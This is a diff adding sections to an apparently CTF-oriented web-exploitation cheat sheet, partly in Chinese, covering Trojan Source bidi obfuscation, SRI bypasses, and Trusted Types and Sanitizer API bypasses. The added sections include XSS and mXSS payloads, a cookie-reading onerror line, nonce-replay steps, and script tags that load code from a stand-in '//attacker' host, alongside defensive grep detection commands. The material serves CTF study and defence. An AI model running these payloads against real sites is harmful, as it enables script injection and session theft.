@@ -4,6 +4,7 @@ Unicode bypass, CSS-only exfiltration, behavioral JS frameworks, timing oracles,
 
 ## Table of Contents
 - [Unicode Case Folding XSS Bypass (UNbreakable 2026)](#unicode-case-folding-xss-bypass-unbreakable-2026)
+- [Unicode Bidi & Trojan Source Obfuscation](#unicode-bidi--trojan-source-obfuscation)
 - [CSS Font Glyph Width + Container Query Exfiltration (UNbreakable 2026)](#css-font-glyph-width--container-query-exfiltration-unbreakable-2026)
 - [Hyperscript CDN CSP Bypass (UNbreakable 2026)](#hyperscript-cdn-csp-bypass-unbreakable-2026)
 - [PBKDF2 Prefix Timing Oracle via postMessage (UNbreakable 2026)](#pbkdf2-prefix-timing-oracle-via-postmessage-unbreakable-2026)
@@ -11,6 +12,8 @@ Unicode bypass, CSS-only exfiltration, behavioral JS frameworks, timing oracles,
 - [Terminal Control Character Obfuscation (SECCON 2015)](#terminal-control-character-obfuscation-seccon-2015)
 - [CSP Bypass via Cloud Function Whitelisted Domain (BSidesSF 2025)](#csp-bypass-via-cloud-function-whitelisted-domain-bsidessf-2025)
 - [CSP Nonce Bypass via base Tag Hijacking (BSidesSF 2026)](#csp-nonce-bypass-via-base-tag-hijacking-bsidessf-2026)
+- [SRI (Subresource Integrity) Bypass Cheatsheet](#sri-subresource-integrity-bypass-cheatsheet)
+- [Trusted Types & Sanitizer API Bypass](#trusted-types--sanitizer-api-bypass)
 - [XSSI via JSONP Callback with Cloud Function Exfiltration (BSidesSF 2026)](#xssi-via-jsonp-callback-with-cloud-function-exfiltration-bsidessf-2026)
 - [CSP Bypass via link prefetch (Boston Key Party 2016)](#csp-bypass-via-link-prefetch-boston-key-party-2016)
 - [Cross-Origin XSS via Shared Parent Domain Cookie Injection (0CTF 2017)](#cross-origin-xss-via-shared-parent-domain-cookie-injection-0ctf-2017)
@@ -47,6 +50,31 @@ Unicode bypass, CSS-only exfiltration, behavioral JS frameworks, timing oracles,
 - `K` (U+212A, Kelvin sign) -> `k` / `K`
 
 **Key insight:** Different layers applying different normalization standards (ASCII-only regex vs. Unicode-aware case folding) create bypass opportunities. Check what processing each layer applies.
+
+---
+
+## Unicode Bidi & Trojan Source Obfuscation
+
+**Pattern (CVE-2021-42574 / CVE-2021-42694, "Trojan Source"):** Unicode directionality control characters (U+202A–U+202E: LRE/RLE/PDF/LRO/RLO; U+2066–U+2069: LRI/RLI/FSI/PDI) reorder *display* without changing *logical* code points. Code can look innocent when rendered yet execute something entirely different — our eyes and the browser/compiler disagree.
+
+**CTF usage:**
+- **Passcode/flag 藏字符串:** 字面量被 RLI/PDI 夹住后肉眼方向反转，读源码抄值抄错；浏览器按逻辑序求值。
+- **注释藏 payload:** 注释行的视觉换行被打乱，`//` 下一条"被注释"的行实际可执行 —— 源码审计题常客。
+- **绕可见文本过滤:** WAF/正则匹配"看起来的内容"时，真实字节（逻辑序）与显示不同 → 绕过关键字黑名单（与 XSS 过滤/审计题联动）。
+
+**Detection（不要相信肉眼）：**
+```bash
+grep -P '[\x{202A}-\x{202E}]' app.js   # LRE/RLE/PDF/LRO/RLO
+grep -P '[\x{2066}-\x{2069}]' app.js   # LRI/RLI/FSI/PDI
+grep -P '[\x{200E}\x{200F}]' app.js    # LRM/RLM 零宽方向标记
+xxd app.js | head                      # 原始字节
+sed 's/[\x{202A}-\x{202E}\x{2066}-\x{2069}]//g' app.js > clean.js
+```
+编辑器通常画点状下划线提示；部分高亮方案反而直接应用 bidi，更误导 —— 审计前一律先清洗。
+
+**关联:** 与[Unicode Case Folding](#unicode-case-folding-xss-bypass-unbreakable-2026)同属"多文本层不一致"家族（normalization vs. bidi vs. case folding）。
+
+**References:** [Trojan Source](https://trojansource.codes/) — CVE-2021-42574（注释/字符串）、CVE-2021-42694（标识符）。
 
 ---
 
@@ -233,6 +261,58 @@ fetch('/api/flag')
 **Detection:** Check CSP for `script-src 'nonce-...'` combined with missing `base-uri` directive. Look for nonced `<script src="relative.js">` tags (relative URL, not absolute) that appear after a potential injection point.
 
 **References:** BSidesSF 2026 "web-tutorial-2"
+
+---
+
+## SRI (Subresource Integrity) Bypass Cheatsheet
+
+**Mechanism:** `<script src="..." integrity="sha384-<digest>">` — 摘要不匹配则拒绝执行。跨源规则：对**跨源**资源做完整性校验时，响应必须可 CORS 读取（带 `Access-Control-Allow-Origin`）；否则浏览器直接跳过校验，脚本照常执行。
+
+**当 X → 试 Y：**
+- **no-cors 跨源上下文** → 把 `src` 指向不返回 CORS 头的攻击者域名：SRI 不生效，脚本照常执行（`<script src="//attacker/x.js">`、`<link href>`、JSONP）。
+- **nonce + integrity 并存** → CSP 只认 nonce：注入带有效 nonce 的标签（nonce 可从 DOM 读，见下节），不带 hash 也放行。
+- **完整性校验失败 fallback** → 失败仅致该标签不执行，页面继续渲染；把 payload 标签排在 404/被破坏的"可信"标签之后顶上。
+- **`fetch()` / `import()`** → SRI 只在调用方自己实现校验时生效；动态 `import()` 模块 URL 无摘要检查。
+- **服务端注入但 integrity 未绑定** → 后端只拼了 `src`、`integrity` 是另一个文件的静态值：改 `src` 指向 payload（保留/删掉属性都测一遍 —— 有的框架只在 hash 匹配时才输出标签，有的直接透传）。
+
+**Detection:** 找 `integrity=` 静态写死而 `src` 含用户可控片段的 script；curl 跨源脚本看是否缺 CORS 头；检查动态 import 路径。
+
+---
+
+## Trusted Types & Sanitizer API Bypass
+
+**Mechanism:** `Content-Security-Policy: require-trusted-types-for 'script'` 把 DOM-XSS sink（`innerHTML`/`outerHTML`/`insertAdjacentHTML`/`document.write`/`script.src`/script 元素文本等）改为只接受 `trustedTypes.createPolicy('<name>', {...})` 产出的 `TrustedHTML`/`TrustedScriptURL`/`TrustedScript` 对象（`'attr'` 关键字仍是实验性，主流浏览器支持有限）。无策略匹配时 fallback 到 default policy；连 default 都没有则 sink 抛异常。Sanitizer API（`new Sanitizer()` / `Element.setHTML()`）在插入前剥掉可执行标记。
+
+**CSP 长这样 → 试这个（速查）：**
+- **宽松 default policy：`createHTML: (s) => s` 或只查 `typeof s === 'string'`** → 所有 HTML sink 形同虚设：直接 `el.innerHTML = '<img src=x onerror=...>'`，TT 只是"贴纸"。同理 `createScriptURL` 只做 typeof 检查 → `script.src` 可指向任意外部脚本。
+- **只 enforce、无 default policy** → sink 抛异常：用 `trustedTypes.getPolicyNames()` 枚举策略，找回调可被参数影响的策略（拼接/模板），把 payload "喂"进该策略的输入。
+- **nonce 泄漏** → `<script nonce=abc>` 的 nonce 在 DOM 可读：`document.querySelector('script[nonce]').nonce`。拿到后注入 `<script nonce=abc src=//attacker>` 重放 —— 前提是把标签放进**完整文档解析**的注入点（服务端反射/存储型 XSS、`srcdoc` iframe）；`innerHTML`/`insertAdjacentHTML` 的 fragment 解析里 `<script>` 不执行，事件属性又无 nonce 可挂。
+- **Trusted Types 不覆盖的执行点（TT 管 sink、不管注入源）：**
+  - `eval()` / `Function()` —— TT 不拦；只有 CSP 禁 `'unsafe-eval'` 才硬拦。
+  - `<iframe srcdoc>`、SVG / `<math>` 内嵌脚本 —— 注入点若是「结构标签 + 属性」而非 HTML sink，TT 管不到。
+  - `javascript:` URL 上下文 —— `<a href>`、`meta refresh`、`window.open()` / `location` 导航不是 TT sink（仅受 CSP `script-src` 约束，`'unsafe-inline'` 决定成败）。
+  - `import()` 动态导入 —— 无 SRI、无 TT 约束，加载即执行。
+- **Sanitizer API mXSS** → 默认 `new Sanitizer()` 在**当前**浏览器版本安全，但：自定义配置（白名单 `elements`/`attributes`、保留 `<style>`/SVG）可能放行危险组合；清洗结果再进一次 `innerHTML`（双重解析）会重组被剥掉的标签。经典 mXSS 家族 payload（DOMPurify 2.0.x 与早期 Sanitizer 原型均中招）形如 `<math><mtext><table><mglyph><style><!--</style><img title="--><img src=x onerror=alert(1)>">` —— 可利用性随浏览器解析器差异变化，**必须现场验证**。SVG `<a>`/`<animate>` 与 `<math>` 命名空间内的 `href`/事件属性是重灾区。
+
+**实战样本（先找这些模式）：**
+```javascript
+// 1) 宽松 default policy —— 等于没开 TT，直接打所有 sink：
+trustedTypes.createPolicy('default', { createHTML: s => s });
+el.innerHTML = '<img src=x onerror=alert(document.cookie)>';   // 放行
+// 若连 default 都没有，sink 抛 TypeError —— 反向确认 TT 真的在 enforce
+
+// 2) nonce 泄漏：
+const n = document.querySelector('script[nonce]')?.nonce;      // 'abc123'
+// 再拼进服务端注入点 / srcdoc iframe 的完整文档：
+//   <script nonce="abc123" src="//attacker/x.js"></script>
+
+// 3) Sanitizer 默认 vs 自定义配置：
+new Sanitizer().sanitize('<img src=x onerror=alert(1)>');       // 默认：剥干净
+new Sanitizer({ elements: ['img'] }).sanitize('<img src=x onerror=alert(1)>');
+// ↑ 白名单配置仍剥事件属性，但 SVG/math/style 组合与 mXSS 需按目标浏览器版本实测
+```
+
+**Detection:** 页面 CSP 含 `require-trusted-types-for` → 先枚举并读全部 `trustedTypes.createPolicy(...)` 回调实现，找宽松放行；测 `eval` 可用性（无 `'unsafe-eval'` 才是硬拦）；Sanitizer 场景先测默认 vs 自定义配置差异与 mXSS 往返。
 
 ---
 
